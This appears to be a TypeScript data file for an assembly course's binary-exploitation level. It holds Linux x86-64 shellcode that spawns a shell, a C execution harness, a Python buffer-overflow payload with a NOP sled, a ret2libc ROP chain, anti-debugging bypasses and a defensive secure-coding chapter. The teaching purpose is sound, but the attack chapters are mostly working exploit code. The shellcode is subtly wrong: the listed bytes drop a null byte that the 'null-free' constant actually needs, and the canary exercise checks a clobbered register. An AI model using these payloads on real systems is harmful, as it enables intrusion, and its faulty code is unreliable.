import { Chapter } from '../types';

export const CHAPTERS_LEVEL_8: Chapter[] = [
  {
    id: 40,
    slug: 'chapter-40-shellcoding-payload-development',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 40: Shellcoding and Payload Development',
    subtitle: 'Crafting Null-Free, Position-Independent x86-64 Machine Code Payloads',
    learningObjectives: [
      'Write position-independent shellcode for Linux x86-64.',
      'Eliminate null bytes (0x00) using xor, mov al, and stack manipulations.',
      'Construct execve("/bin/sh", NULL, NULL) in 24 bytes.',
      'Test shellcode using a C execution harness with mmap and PROT_EXEC.'
    ],
    prerequisites: ['Chapters 1–17'],
    keyConcepts: [
      'Shellcode must be position-independent because injection targets vary.',
      'Null bytes terminate string copies (strcpy), breaking buffer overflow exploits.',
      'Direct system calls bypass libc dependencies.'
    ],
    diagramType: 'shellcoding',
    sections: [
      {
        id: 'sec-40-1',
        title: '40.1 24-Byte Null-Free execve("/bin/sh") Shellcode',
        content: `Complete NASM source code and raw byte sequence:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'shellcode.asm',
            code: `; execve("/bin/sh", NULL, NULL) - 24 bytes, 0 nulls!
section .text
    global _start

_start:
    xor edx, edx              ; envp = NULL (31 D2)
    push rdx                  ; null terminator on stack (52)
    mov rbx, 0x68732f6e69622f ; "/bin/sh" in little-endian (48 BB 2F 62 69 6E 2F 73 68)
    push rbx                  ; (53)
    mov rdi, rsp              ; rdi = pointer to "/bin/sh" (48 89 E7)
    xor esi, esi              ; argv = NULL (31 F6)
    xor eax, eax              ; (31 C0)
    mov al, 59                ; sys_execve (B0 3B)
    syscall                   ; (0F 05)`
          },
          {
            language: 'c',
            title: 'C Testing Harness',
            code: `#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char shellcode[] = {
    0x31, 0xd2, 0x52, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
    0x53, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x3b, 0x0f, 0x05
};

int main() {
    void *mem = mmap(NULL, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    memcpy(mem, shellcode, sizeof(shellcode));
    ((void (*)())mem)();
    return 0;
}`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-40-1',
        title: 'Exercise 40.1: Null-Free exit(42)',
        description: 'Construct null-free machine code to call exit(42) in 11 bytes.',
        solution: `xor edi, edi\nmov dil, 42         ; exit code 42\nxor eax, eax\nmov al, 60          ; sys_exit\nsyscall`,
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why must shellcode avoid null bytes (0x00)?',
        answer: 'Because many buffer overflow vulnerabilities occur in string functions like strcpy or gets, which treat 0x00 as the end-of-string delimiter, truncating the payload upon copying.'
      }
    ],
    summary: ['Shellcode delivers compact, self-contained machine code execution.', 'Null avoidance requires register zeroing and sub-register writes.']
  },
  {
    id: 41,
    slug: 'chapter-41-buffer-overflows-memory-corruption',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 41: Buffer Overflows and Memory Corruption',
    subtitle: 'Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)',
    learningObjectives: [
      'Understand how buffer overflows overwrite saved stack frames and return addresses.',
      'Calculate precise payload padding using GDB stack examination.',
      'Construct a NOP sled to improve shellcode jump reliability.',
      'Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.'
    ],
    prerequisites: ['Chapters 1–40'],
    keyConcepts: [
      'Writing past a stack buffer overwrites saved RBP and saved return address (RIP).',
      'NOP sleds (0x90) provide a forgiving landing pad for shellcode execution.',
      'NX (No-Execute) prevents execution of code residing in stack or heap pages.'
    ],
    diagramType: 'buffer_overflow',
    sections: [
      {
        id: 'sec-41-1',
        title: '41.1 Crafting the Stack Exploit Payload in Python',
        content: `Python exploit script calculating padding to return address:`,
        codeSnippets: [
          {
            language: 'python',
            title: 'exploit_payload.py',
            code: `import struct

shellcode = b"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05"

offset = 72                             # 64-byte buffer + 8-byte saved RBP
nop_sled = b"\\x90" * 40                  # 40 bytes of NOPs
padding = b"A" * (offset - len(nop_sled) - len(shellcode))
return_addr = struct.pack("<Q", 0x7fffffffe020 + 10)  # points into NOP sled

payload = nop_sled + shellcode + padding + return_addr
print(payload)`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-41-1',
        title: 'Exercise 41.1: Stack Canary Detection',
        description: 'Explain how stack canaries prevent stack smashing exploits.',
        solution: 'A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process.'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is the purpose of Address Space Layout Randomization (ASLR)?',
        answer: 'ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets.'
      }
    ],
    summary: ['Buffer overflows corrupt adjacent stack memory.', 'Modern defenses (canaries, NX, ASLR) enforce memory safety.']
  },
  {
    id: 42,
    slug: 'chapter-42-return-oriented-programming-rop',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 42: Return-Oriented Programming (ROP) and Code Reuse',
    subtitle: 'Defeating NX/DEP: Gadget Hunting, Ret2Libc, and Stack Pivoting',
    learningObjectives: [
      'Understand how Return-Oriented Programming bypasses non-executable stack (NX) protections.',
      'Harvest instruction gadgets ending in ret using ROPgadget and ropper.',
      'Construct a ret2libc attack chain calling system("/bin/sh").',
      'Implement stack pivoting with xchg rax, rsp; ret.'
    ],
    prerequisites: ['Chapters 1–41'],
    keyConcepts: [
      'ROP reuses existing executable code fragments instead of injecting new instructions.',
      'In x86-64, pop rdi; ret loads the first argument for system().',
      'Stack pivoting redirects the stack pointer to a controlled memory buffer.'
    ],
    diagramType: 'rop_code_reuse',
    sections: [
      {
        id: 'sec-42-1',
        title: '42.1 Constructing a Ret2Libc ROP Chain',
        content: `Chaining gadgets to call system("/bin/sh"):`,
        codeSnippets: [
          {
            language: 'python',
            title: 'rop_chain.py',
            code: `import struct

offset = 72
pop_rdi = 0x7ffff7a3e55f      # Gadget: pop rdi; ret
bin_sh  = 0x7ffff7b99d57      # Address of string "/bin/sh" in libc
system  = 0x7ffff7a52390      # Address of system() function in libc

payload = b"A" * offset
payload += struct.pack("<Q", pop_rdi)   # return to gadget
payload += struct.pack("<Q", bin_sh)    # popped into RDI
payload += struct.pack("<Q", system)    # return to system(rdi)`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-42-1',
        title: 'Exercise 42.1: Ret2Syscall Chain Structure',
        description: 'Design a ROP chain to execute execve("/bin/sh", 0, 0) via raw syscall gadgets.',
        solution: 'Chain layout: [pop rax; ret, 59] -> [pop rdi; ret, "/bin/sh"] -> [pop rsi; ret, 0] -> [pop rdx; ret, 0] -> [syscall; ret].'
      }
    ],
    practiceQuestions: [
      {
        question: 'Why is ROP immune to NX/DEP memory protections?',
        answer: 'Because ROP does not execute any instructions from writable memory pages (stack or heap). It only executes instructions already located in existing, legitimate, executable code segments (such as libc or the binary itself).'
      }
    ],
    summary: ['ROP chains existing code gadgets ending in ret.', 'ret2libc and ret2syscall defeat non-executable stack protections.']
  },
  {
    id: 43,
    slug: 'chapter-43-anti-debugging-anti-analysis',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 43: Anti-Debugging and Anti-Analysis Techniques',
    subtitle: 'Ptrace Detection, TracerPid Scanning, Timing Checks, and Junk Byte Obfuscation',
    learningObjectives: [
      'Recognize anti-debugging techniques: ptrace(PTRACE_TRACEME), TracerPid, and INT 3.',
      'Detect virtual machines using CPUID hypervisor bit and artifact scanning.',
      'Deconstruct anti-disassembly tricks like overlapping instructions and opaque predicates.',
      'Bypass anti-debugging checks in GDB by patching instructions or altering register flags.'
    ],
    prerequisites: ['Chapters 1–42'],
    keyConcepts: [
      'ptrace fails if a debugger is already attached, signaling detection.',
      'Reading /proc/self/status reveals whether TracerPid is non-zero.',
      'Opaque predicates create branches that always evaluate the same way to mislead disassemblers.'
    ],
    diagramType: 'anti_debugging',
    sections: [
      {
        id: 'sec-43-1',
        title: '43.1 Anti-Disassembly via Junk Bytes and Overlap',
        content: `Misleading linear sweep disassemblers with jumped-over call opcodes:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'anti_disasm.asm',
            code: `section .text
    global _start
_start:
    jmp .real_code
    db 0xE8          ; junk byte that looks like opcode for 'call' to linear disassembler!
.real_code:
    mov rax, 60
    xor rdi, rdi
    syscall`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-43-1',
        title: 'Exercise 43.1: Bypass ptrace Check in GDB',
        description: 'Bypass a ptrace check by setting rax=0 or patching the conditional branch.',
        solution: 'In GDB: break _start -> stepi past syscall -> set $rax = 0 -> continue. Or patch the js branch to nop nop.',
        solutionLanguage: 'gdb'
      }
    ],
    practiceQuestions: [
      {
        question: 'How do timing checks detect debugger presence?',
        answer: 'Human-driven breakpoints and single-stepping take millions of clock cycles compared to bare CPU execution. Instructions like rdtsc measure cycle elapsed across a block; an abnormally high difference signals active debugging.'
      }
    ],
    summary: ['Anti-analysis tactics resist reverse engineering.', 'Analysts overcome defenses using binary patching and dynamic instrumentation.']
  },
  {
    id: 44,
    slug: 'chapter-44-secure-coding-defensive-assembly',
    level: 8,
    levelTitle: 'Security and Binary Exploitation',
    title: 'Chapter 44: Secure Coding and Defensive Assembly',
    subtitle: 'Bounds Checking, Arithmetic Overflow Verification, Manual Canaries, and RELRO',
    learningObjectives: [
      'Apply defensive programming standards to pure assembly and C interop code.',
      'Implement bounds-checked string and memory copy routines.',
      'Verify integer overflow on arithmetic using jo and jc flags.',
      'Implement custom stack canaries with getrandom syscall (318).'
    ],
    prerequisites: ['Chapters 1–43'],
    keyConcepts: [
      'Bounds checking prevents memory writes beyond buffer allocations.',
      'Arithmetic checks catch integer overflows before buffer calculations.',
      'Full RELRO makes the GOT read-only to prevent malicious redirection.'
    ],
    diagramType: 'defensive_assembly',
    sections: [
      {
        id: 'sec-44-1',
        title: '44.1 Bounds-Checked String Copy (safe_strcpy)',
        content: `A resilient string copy that guarantees null-termination without overflowing destination:`,
        codeSnippets: [
          {
            language: 'nasm',
            title: 'safe_strcpy.asm',
            code: `; safe_strcpy: rdi=dest, rsi=src, rdx=dest_size
; returns 0 on success, -1 on truncation
global safe_strcpy
section .text
safe_strcpy:
    push rdi; push rsi; push rbx
    mov rbx, rdx        ; remaining space
    xor eax, eax
.loop:
    cmp rbx, 1
    jle .truncated      ; leave 1 byte for null
    mov cl, [rsi]
    mov [rdi], cl
    inc rsi; inc rdi; dec rbx
    test cl, cl; jz .done
    jmp .loop
.truncated:
    mov byte [rdi], 0   ; guarantee null terminator
    mov eax, -1
.done:
    pop rbx; pop rsi; pop rdi; ret`
          },
          {
            language: 'nasm',
            title: 'safe_add.asm (Safe Addition with Overflow Detection)',
            code: `; safe_add: rdi=a, rsi=b, rdx=ptr_to_result
; returns 0 on success, -1 on overflow
safe_add:
    mov rax, rdi
    add rax, rsi
    jo .overflow
    mov [rdx], rax
    xor eax, eax
    ret
.overflow:
    mov eax, -1
    ret`
          }
        ]
      }
    ],
    exercises: [
      {
        id: 'ex-44-1',
        title: 'Exercise 44.1: Manual Stack Canary Implementation',
        description: 'Read a random 64-bit word with sys_getrandom (318), store at [rbp-8], and verify before return.',
        solution: `sub rsp, 8\nmov rax, 318; mov rdi, rsp; mov rsi, 8; xor rdx, rdx; syscall\nmov rax, [rsp]; add rsp, 8\n; store in stack frame\nmov [rbp-8], rax\n; ... body ...\nmov rcx, [rbp-8]; cmp rax, rcx; jne .abort`,
        solutionLanguage: 'nasm'
      }
    ],
    practiceQuestions: [
      {
        question: 'What is Full RELRO and how does it prevent exploitation?',
        answer: 'Full RELRO (Relocation Read-Only) resolves all dynamic symbols at program startup and marks the Global Offset Table (GOT) as completely read-only, preventing attackers from overwriting function pointers.'
      }
    ],
    summary: ['Defensive assembly implements explicit bounds and arithmetic safety.', 'Security flags (canaries, PIE, RELRO) harden binaries against memory corruption.']
  }
];
